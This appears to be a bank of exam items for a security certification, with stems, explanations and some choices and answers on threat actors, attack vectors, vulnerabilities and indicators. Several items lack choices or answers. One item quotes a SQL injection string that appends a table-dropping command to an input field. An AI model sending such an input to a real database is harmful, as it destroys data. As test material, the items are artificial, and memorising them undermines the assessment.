exam_bank.explanation: Because shadow IT is set up without IT's knowledge, it misses patching, monitoring and security review. Its users are usually well-meaning, so profit-driven intent is not the defining problem.

exam_bank.stem: A sales team started using a free browser extension that records and transcribes customer calls. Nobody asked IT, and the extension uploads every recording to the vendor's servers. Which of the following BEST describes this threat?
exam_bank.explanation: Staff adopting an unapproved tool that handles company data is shadow IT. No outside group is attacking the company, so nation-state and organized crime do not apply.

exam_bank.stem: A call center agent was paid by an outside group to look up customer accounts and photograph the details on screen. Which of the following BEST describes the agent?
exam_bank.explanation: The agent uses legitimate internal access to steal data, which makes the agent an insider threat. The outside group paying the agent may be organized crime, but the question asks about the agent.

exam_bank.stem: When classifying threat actors, which of the following attributes describes whether the actor already has access inside the organization?
exam_bank.explanation: The internal/external attribute separates actors who already have inside access, such as employees, from those attacking from outside. Sophistication describes skill, not where the actor starts.

exam_bank.stem: After an incident, analysts found that the attacker wrote custom malware, used encrypted command channels and wiped its own traces with anti-forensics tools. Which of the following threat actor attributes does this evidence MOST directly show?
exam_bank.explanation: Custom tools and careful anti-forensics show a high level of skill and capability. Funding may support such skill, but the evidence itself measures what the attacker can do, not how much money it has.

exam_bank.stem: A criminal group rents thousands of cloud servers, buys initial access to victim networks from brokers and pays affiliates a share of every ransom. Which of the following threat actor attributes is MOST evident?
exam_bank.explanation: Renting large infrastructure and buying access shows that the group has significant money to spend. Nothing in the scenario describes the group's own technical skill, so sophistication is not the best answer.

exam_bank.stem: A contractor with a valid badge and network account plugged a hardware keylogger into a manager's workstation. Why are perimeter firewalls LEAST effective against this type of threat actor?
choices: The actor always has the funding of a nation-state government
The actor is driven by political beliefs
The actor is already inside with authorized access
The actor only uses zero-day exploits
exam_bank.answer: The actor is already inside with authorized access
exam_bank.explanation: Perimeter defenses filter traffic coming from outside, but an internal actor already has legitimate access past them. Insiders are not defined by funding, zero-days or politics.

exam_bank.stem: Which of the following threat actors is typically rated LOWEST in both resources and sophistication?
exam_bank.explanation: An unskilled attacker usually works alone with free tools and little money. Hacktivist groups vary, but they often include skilled members and can pool resources for a cause.

exam_bank.stem: An attacker installed cryptocurrency mining software on hundreds of a company's cloud servers. The company's compute bill tripled while the coins went to the attacker's wallet. Which of the following motivations BEST describes this attack?
exam_bank.explanation: Using someone else's computing power to mine coins is done to make money. The servers kept running, so service disruption was a side effect rather than the goal.

exam_bank.stem: Which of the following motivations describes an attacker whose main goal is to copy sensitive information out of an organization to a location the attacker controls?
exam_bank.explanation: Data exfiltration is the unauthorized transfer of data out of an organization. Blackmail may follow a theft, but it is defined by the threat used to pressure the victim, not by the copying itself.

exam_bank.stem: A group defaced dozens of unrelated websites, deleted files at random and posted that they did it to watch things break. They asked for no money and promoted no cause. Which of the following motivations is MOST likely?
exam_bank.explanation: Random damage with no profit or message points to a desire for disruption and chaos. Political beliefs would come with a cause or message, which the group did not have.

exam_bank.stem: Attackers repeatedly flooded a city's online emergency reporting system with traffic so residents could not submit reports. Nothing was stolen and no payment was demanded. Which of the following motivations BEST describes this attack?
exam_bank.explanation: The goal was to stop a service from working, which is service disruption. No data left the system, so data exfiltration and espionage do not fit.

exam_bank.stem: Employees at a design firm received direct messages in the company's chat platform from an external guest account. Each message contained a link to a shared project file that installed malware. Which of the following threat vectors was used?
exam_bank.explanation: Messages sent through a chat or collaboration platform use the instant messaging vector. SMS refers to text messages sent over the mobile phone network, not to a workplace chat tool.

exam_bank.stem: An attacker left voicemails for several employees claiming to be the bank's fraud department and asked them to call back a number the attacker controlled. Which of the following threat vectors does this BEST describe?
exam_bank.explanation: The lure is delivered by phone and voicemail, which is the voice call vector. Email could carry a similar story, but nothing in this attack was sent by email.

exam_bank.stem: A company is choosing between a remote support tool that needs a program installed on every laptop and one that runs entirely in a web browser. From an attack surface view, which of the following is the MAIN advantage of the browser-based option?
choices: It encrypts all data on the laptop's disk
It cannot be affected by any software vulnerability at all
It removes the need for user authentication
No extra client software on each laptop can be exploited
exam_bank.answer: No extra client software on each laptop can be exploited
exam_bank.explanation: Agentless tools avoid adding installed software to every endpoint, so there is less client-based code for attackers to exploit. They still have vulnerabilities on the server side, so they are not immune.

exam_bank.stem: The payroll team still uses a desktop accounting program whose vendor went out of business four years ago. A flaw in the program's file import feature was published last week. Which of the following BEST explains why this program is a high-risk threat vector?
choices: It is unsupported and will not receive security fixes
It is exposed to the internet on an open service port
exam_bank.answer: It is unsupported and will not receive security fixes
exam_bank.explanation: Software with no vendor support stays vulnerable because no patch will ever be released. Nothing in the scenario mentions default logins or listening network ports.

exam_bank.stem: An attacker exploited a flaw in an outdated browser plug-in that employees still had installed, even though no business task needed it anymore. Which of the following threat vectors was used?
exam_bank.explanation: The flaw was in software installed on the users' devices, which is client-based vulnerable software. Open service ports refer to listening network services, not a browser plug-in.

exam_bank.stem: A coffee shop's guest Wi-Fi uses no encryption. An attacker sitting in the shop captures other customers' unencrypted traffic as it passes over the air. Which of the following threat vectors is being exploited?
exam_bank.explanation: An open Wi-Fi network lets anyone within range capture the traffic, which makes it an unsecure wireless vector. Nothing is plugged into a cable, so the wired vector does not apply.

exam_bank.stem: At a trade show, an attacker sent unsolicited files to nearby phones and copied contact lists from several phones that were left discoverable and accepted pairing without a PIN. Which of the following threat vectors was used?
exam_bank.explanation: Discoverable phones that pair without a PIN expose the Bluetooth vector, which allows attacks such as bluejacking and bluesnarfing. The attacker never joined a Wi-Fi network, so the wireless network vector is not the best fit.

exam_bank.stem: A visitor plugged a laptop into an active network jack in a building lobby and received an address on the internal network with no authentication. Which of the following threat vectors does this BEST describe?
exam_bank.explanation: A live network jack that grants access without authentication is an unsecure wired network. Open service ports refer to services listening on a host, not to physical network access.

exam_bank.stem: A remote employee's home router still uses an old Wi-Fi encryption protocol that attackers can crack in minutes. Which of the following threat vectors does this create for the company laptop used there?
exam_bank.explanation: Weak, crackable Wi-Fi encryption makes the wireless network itself an unsecure vector. Default credentials would concern the router's admin login, which the scenario does not mention.

exam_bank.stem: Which of the following is the BEST example of an unsecure wired network threat vector?
choices: A phone left discoverable to nearby devices
An attacker joining an open guest Wi-Fi network
A rogue device plugged into an open conference room jack
A fake access point broadcasting the company network name
exam_bank.answer: A rogue device plugged into an open conference room jack
exam_bank.explanation: Plugging into an unprotected Ethernet jack attacks the wired network. The fake access point and open guest Wi-Fi are wireless vectors, and the discoverable phone is a Bluetooth vector.

exam_bank.stem: A new network-attached storage device was connected with SSH, FTP, SMB and a web interface all enabled, but staff only use SMB to reach their files. Which of the following attack surfaces does this BEST describe?
exam_bank.explanation: Every enabled service listens on a port that attackers can probe, so unneeded services widen the attack surface. The scenario says nothing about factory logins, so default credentials is not the issue described.

exam_bank.stem: Which of the following attack surfaces is MOST easily exploited using username and password lists collected from vendor manuals and support websites?
exam_bank.explanation: Vendors publish factory usernames and passwords, so devices that keep them can be logged in to with public lists. Open ports expose services, but they do not by themselves give the attacker a working login.

exam_bank.stem: A smart TV in the boardroom was found running a debug Telnet service that the manufacturer left enabled and that any device on the network can connect to. Which of the following attack surfaces does this BEST describe?
exam_bank.explanation: A forgotten service listening for connections is an open service port that attackers can reach. Bluetooth and removable devices are separate vectors that do not involve a network listener.

exam_bank.stem: A heating and cooling maintenance vendor had remote access to a retailer's network to monitor equipment. Attackers stole the vendor's credentials and used that access to reach the retailer's payment systems. Which of the following threat vectors does this BEST describe?
exam_bank.explanation: The attackers reached the retailer through a trusted vendor's access, which is a supply chain vector. The vendor's credentials were stolen, not factory defaults, so default credentials does not fit.

exam_bank.stem: A company bought network switches whose firmware contained a hidden administrator account that the supplier's subcontractor had inserted during manufacturing. Which of the following threat vectors BEST describes how the weakness entered the company?
exam_bank.explanation: The weakness came in through a supplier before the devices ever arrived, which is a supply chain vector. A hidden account added on purpose is a backdoor, not a documented factory default.

exam_bank.stem: Why does a managed service provider (MSP) represent a supply chain threat vector for its customers?
choices: Its trusted access to many customer networks can be abused
It always leaves default credentials on devices
It removes the customer's need for any internal security staff
It stores all customer data in public storage
exam_bank.answer: Its trusted access to many customer networks can be abused
exam_bank.explanation: An MSP holds privileged access to many customers at once, so compromising the MSP opens a path into all of them. MSPs do not inherently use default credentials; the risk comes from the trust and access they hold.

exam_bank.stem: An employee shared a social media post claiming the company's VPN had been hacked and urging coworkers to stop using it. The employee believed the post was true, but it was false. Which of the following BEST describes the employee's post?
exam_bank.explanation: Misinformation is false information spread by someone who believes it is true. Disinformation would require the person to know the claim is false and spread it on purpose.

exam_bank.stem: A man in a high-visibility vest carrying a clipboard told the receptionist he worked for the electric company and needed to inspect the meter room. The receptionist let him in. Which of the following social engineering techniques did he use?
exam_bank.explanation: Pretending to be a trusted worker to gain access is impersonation. Business email compromise uses a real or spoofed email account, and no email was involved here.

exam_bank.stem: A product search page builds its database query directly from whatever the user types. When a tester enters a single apostrophe, the page shows a database syntax error. Which of the following vulnerabilities is MOST likely present?
exam_bank.explanation: A database error triggered by a quote character shows that user input is changing the structure of the SQL query. Cross-site scripting affects scripts run in the browser, not database queries.

exam_bank.stem: A site's search page displays No results for followed by the search term exactly as typed. A link with a script in the search term runs that script in the browser of anyone who clicks it. Which of the following vulnerabilities is present?
exam_bank.explanation: Reflecting unencoded input back into a page lets attacker script run in the victim's browser, which is cross-site scripting. SQL injection targets the database, and nothing here reaches a database.

exam_bank.stem: Which of the following BEST describes the root cause shared by SQL injection and cross-site scripting vulnerabilities?
choices: The application stores passwords in plain text
The web server's operating system has passed its vendor end-of-life date
The server uses an outdated encryption cipher
The application trusts input without validating or encoding it
exam_bank.answer: The application trusts input without validating or encoding it
exam_bank.explanation: Both flaws exist because untrusted input is passed into a query or a page without proper validation or encoding. Weak ciphers and plaintext passwords are cryptographic issues, not injection issues.

exam_bank.stem: A newly announced flaw in a built-in Windows service lets any local user gain full system privileges on every unpatched workstation, no matter which applications are installed. Which of the following types of vulnerabilities is this?
exam_bank.explanation: The flaw lives in a component of the operating system itself, so it affects every unpatched machine. An application vulnerability would depend on a particular program being installed.

exam_bank.stem: A factory's production line is controlled by a computer running a 20-year-old operating system. The vendor still sells paid extended support, but the computer cannot run modern security agents. Which of the following BEST describes this system?
exam_bank.explanation: A legacy system is old and outdated but may still be in use and even receive limited support. Nothing points to a flaw in low-level device code, so firmware is not the best description of the system as a whole.

exam_bank.stem: A laptop maker released a BIOS update to fix a flaw that let attackers turn off secure boot before the operating system loads. Which of the following types of vulnerabilities did the update fix?
exam_bank.explanation: The BIOS is firmware stored on the motherboard, so a flaw in it is a firmware vulnerability. It runs before the operating system starts, which is why it is not an operating system flaw.

exam_bank.stem: A security team learns that the hypervisor on its virtualization cluster has a flaw that lets code in a guest run on the host. Why is this vulnerability MORE serious than a similar flaw on a single physical server?
choices: One compromise can affect every guest on that host
Virtual machines cannot receive security patches from their vendors
exam_bank.answer: One compromise can affect every guest on that host
exam_bank.explanation: Breaking out to the host exposes all the virtual machines that share it, so the impact is multiplied. Virtual machines can be patched and encrypted, so those distractors are false.

exam_bank.stem: Which of the following categories of vulnerabilities BEST describes weaknesses such as insecure provider APIs, weak tenant isolation and exposed management consoles?
exam_bank.explanation: Provider APIs, tenant isolation and management consoles are features of cloud environments, so these are cloud-specific vulnerabilities. They do not depend on a particular operating system or device.

exam_bank.stem: When a virtual desktop session ends, the pool hands the same virtual disk to the next user without resetting it. The next user finds the previous user's downloaded files. Which of the following vulnerabilities does this describe?
exam_bank.explanation: Reassigning storage to a new user without clearing it is resource reuse. VM escape involves breaking out of a guest to reach the host, which did not happen here.

exam_bank.stem: Attackers compromised the maintainer of a third-party JavaScript library and published a tampered release, which a retailer then included in its checkout pages. Every checkout page began sending card details to the attackers. Which of the following supply chain risks does this represent?
exam_bank.explanation: The compromised component is code supplied by a third party, which is a software provider risk. No physical device was tampered with, so the hardware provider risk does not apply.

exam_bank.stem: A company outsourced its help desk. Attackers compromised the outsourcing firm and used its staff accounts to reset passwords for the company's employees. Which of the following supply chain risks does this represent?
exam_bank.explanation: The weakness came from a third party providing a service with access to company systems. No code or devices from the vendor were involved, so software and hardware provider risks do not fit.

exam_bank.stem: Which of the following practices BEST reduces supply chain risk from hardware providers?
choices: Scanning every internal web application for injection flaws before release
Requiring longer passwords for all users
Moving all servers to a public cloud
Buying only through authorized channels and checking device integrity
exam_bank.answer: Buying only through authorized channels and checking device integrity
exam_bank.explanation: Counterfeit or tampered hardware usually enters through unauthorized resellers, so buying from trusted channels and verifying devices reduces the risk. Moving to the cloud just shifts the hardware risk to another provider.

exam_bank.stem: Which of the following is the BEST example of a software provider supply chain risk?
choices: A vulnerable open-source library inside a purchased app
A server delivered with a damaged power supply
An outsourced help desk with weak reset procedures
A counterfeit network card from a gray-market reseller
exam_bank.answer: A vulnerable open-source library inside a purchased app
exam_bank.explanation: A flawed component built into software from a vendor is a software provider risk. The counterfeit network card is a hardware provider risk, and the help desk is a service provider risk.

exam_bank.stem: A code review finds that a web application stores user passwords as unsalted MD5 hashes. Which of the following types of vulnerabilities is this?
exam_bank.explanation: MD5 is a weak hash, and without salts identical passwords produce identical hashes, so the protection is easy to break. This is a cryptographic weakness, not a memory or mobile flaw.

exam_bank.stem: A new web server went live with directory listing turned on and the vendor's sample applications still installed. Which of the following vulnerabilities is MOST likely?
exam_bank.explanation: Leaving insecure defaults and sample content in place is a misconfiguration. A zero-day is an unknown flaw with no patch, while this problem can be fixed simply by changing settings.

exam_bank.stem: While troubleshooting, an administrator added a firewall rule that allows all traffic from any source to any destination and forgot to remove it. Which of the following vulnerabilities did this create?
exam_bank.explanation: An overly permissive rule left in place by mistake is a misconfiguration. The firewall's software and firmware are working as designed, so it is not a firmware flaw.

exam_bank.stem: Why do organizations commonly block side loading on company-managed phones?
choices: Side loading switches off the cellular radio
Side-loaded apps cannot ever be uninstalled
Side loading always requires jailbreaking or rooting the device first
Apps from outside the official store skip its security review
exam_bank.answer: Apps from outside the official store skip its security review
exam_bank.explanation: Official app stores screen apps before publishing them, and side-loaded apps bypass that review. Many devices can side load without being jailbroken, so the jailbreaking option is false.

exam_bank.stem: Attackers began exploiting a flaw in a popular email server on the same day it was discovered, before the vendor had published any advisory or patch. Which of the following BEST describes this vulnerability?
exam_bank.explanation: A flaw exploited before the vendor knows about it or can fix it is a zero-day. An end-of-life product may go unpatched because the vendor is ending support, not because the flaw is new.

exam_bank.stem: A free browser toolbar that a user installed quietly records every website visited and every search term entered, then sends the data to a marketing server. Which of the following types of malware is this?
exam_bank.explanation: Software that secretly collects information about a user's activity and sends it elsewhere is spyware. A worm spreads on its own across a network, which the toolbar does not do.

exam_bank.stem: A shipment of new laptops arrived with many vendor trial programs and utilities already installed. They slow the laptops down, are not needed and are rarely updated. Which of the following BEST describes this software?
exam_bank.explanation: Unneeded software preinstalled by the manufacturer is bloatware; it wastes resources and adds unpatched attack surface. A trojan pretends to be useful in order to deliver hidden malicious code, which is not described here.

exam_bank.stem: Malicious code attached itself to program files on a shared drive. It spread only when users ran one of the infected programs and then infected other programs on their computers. Which of the following types of malware is this?
exam_bank.explanation: A virus attaches to other files and needs a user to run the infected file to spread. A worm spreads by itself across the network without any user action.

exam_bank.stem: Overnight, someone pried open a locked side door of a data center and broke the lock on a server rack to remove several drives. Which of the following attacks does this BEST describe?
exam_bank.explanation: Forcing doors and locks open is a physical brute force attack. Tailgating means following an authorized person through a door, and no one was present here.

exam_bank.stem: An intruder held a heat source to a sensor in a server room, which set off the fire suppression system and forced an emergency shutdown of every server. Which of the following types of attacks is this?
exam_bank.explanation: Manipulating building systems such as fire suppression, power or cooling to disrupt computers is an environmental attack. The intruder did not force any lock or barrier, so it is not physical brute force.

exam_bank.stem: Which of the following is the BEST indicator that an employee's access badge may have been cloned?
choices: The photo printed on the badge has faded
The badge opened doors in two buildings at the same moment
The main entrance badge reader went offline
The employee was issued a temporary badge after forgetting it one day
exam_bank.answer: The badge opened doors in two buildings at the same moment
exam_bank.explanation: A single badge cannot be in two places at once, so simultaneous use strongly suggests a copy exists. A temporary badge is a normal process and does not show that the original was copied.

exam_bank.stem: A company's server is receiving a flood of SYN-ACK packets from hundreds of legitimate web servers, even though it never sent them any connection requests. Each reply is about the same size as the request that caused it. Which of the following attacks is MOST likely taking place?
exam_bank.explanation: The attacker spoofs the victim's address so that third-party servers reflect their replies at it, which is a reflected DDoS. It is not amplified because the replies are no larger than the requests.

exam_bank.stem: Laptops on the office Wi-Fi keep dropping their connections. A wireless capture shows a stream of management frames ordering clients to disconnect that appear to come from the company's access point but are sent by an unknown device. Which of the following attacks is MOST likely occurring?
exam_bank.explanation: Forged deauthentication frames knock clients off the wireless network. This is often done before an evil twin attack, but the capture shows no fake access point, only the forced disconnections.

exam_bank.stem: An attacker captured a valid sign-in request on the network and later sent it to the application again without changing it. The application accepted it and opened a session for the attacker. Which of the following attacks is this?
exam_bank.explanation: Resending captured valid data to gain access is a replay attack. Brute force involves guessing many passwords, but the attacker here guessed nothing.

exam_bank.stem: A web application firewall logs the following request to an order lookup page: `id=105; DROP TABLE orders--`. Which of the following attacks does this request show?
exam_bank.explanation: The request adds a database command to an input field, which is a SQL injection attempt. Directory traversal would use ../ sequences to reach files outside the web folder.

exam_bank.stem: A service's crash log shows that a client sent a username field containing 5,000 letter A characters followed by unreadable binary data, and then the service restarted unexpectedly. Which of the following attacks is MOST likely?
exam_bank.explanation: An oversized input followed by binary data and a crash is a typical sign of a buffer overflow attempt to overwrite memory. Injection inserts commands into a query or interpreter rather than overrunning a memory buffer.

exam_bank.stem: Researchers produced two different contract documents that have the same MD5 hash, so a digital signature on one also appears valid on the other. Which of the following attacks does this describe?
exam_bank.explanation: A collision occurs when two different inputs produce the same hash, which defeats integrity checks and signatures. A downgrade attack forces weaker protocol settings and does not create matching hashes.

exam_bank.stem: On hotel Wi-Fi, an on-path device stripped the redirect that normally moves visitors from the HTTP to the HTTPS version of a banking site, so the user's session stayed unencrypted. Which of the following attacks is this?
exam_bank.explanation: Forcing a connection to use a weaker or unencrypted mode, as in SSL stripping, is a downgrade attack. Collision and birthday attacks target hash functions, not the choice of protocol.

exam_bank.stem: A security architect replaced a short 64-bit hash used to check file integrity with SHA-256, specifically so attackers cannot practically find any two files with the same hash. Which of the following attacks is the architect MOST directly defending against?
exam_bank.explanation: A birthday attack uses probability to find matching hashes in far fewer attempts than expected, and short hashes make that practical. Longer hash outputs defend against it; downgrade and replay attacks are unaffected by hash length.

exam_bank.stem: An attacker stole a copy of a company's password hash database and is testing billions of guesses per second on their own hardware. No failed logins appear in the company's logs. Which of the following attacks is this?
exam_bank.explanation: Guessing against stolen hashes on the attacker's own system is an offline attack, so it never touches the login service or its logs. An online brute force attack would generate failed logins and possibly lockouts.

exam_bank.stem: Why do attackers often use password spraying instead of traditional brute force against online accounts?
choices: To reuse a captured session token
To stay under account lockout thresholds
To bypass encryption on the network
To crack stolen hashes faster offline
exam_bank.answer: To stay under account lockout thresholds
exam_bank.explanation: Trying one or two common passwords across many accounts keeps each account below the lockout limit. Cracking stolen hashes offline is a different attack that does not interact with live accounts.

exam_bank.stem: Dozens of users across several departments were locked out within the same ten minutes. Logs show about 30 failed attempts against each of those accounts from one external address. Which of the following attacks is MOST likely?
exam_bank.explanation: Many guesses against each account until it locks is a brute force attack. Password spraying uses only a few attempts per account specifically to avoid the lockouts seen here.

exam_bank.stem: A server normally writes logs only during its nightly batch job. An analyst finds large new log entries written at 3:15 PM on a Sunday when no jobs were scheduled. Which of the following indicators does this BEST describe?
exam_bank.explanation: Log activity at a time when the system normally writes nothing is out-of-cycle logging and may mean someone is using the system. Missing logs would be a gap in records, not unexpected extra entries.

exam_bank.stem: A web server's CPU has been near 100% for three days and its outbound traffic has tripled, although the number of website visitors has not changed. Which of the following indicators does this BEST describe?
exam_bank.explanation: Unexplained high CPU and network use points to unwanted activity such as cryptomining or data exfiltration. Resource inaccessibility would mean users could not reach the server or its data.
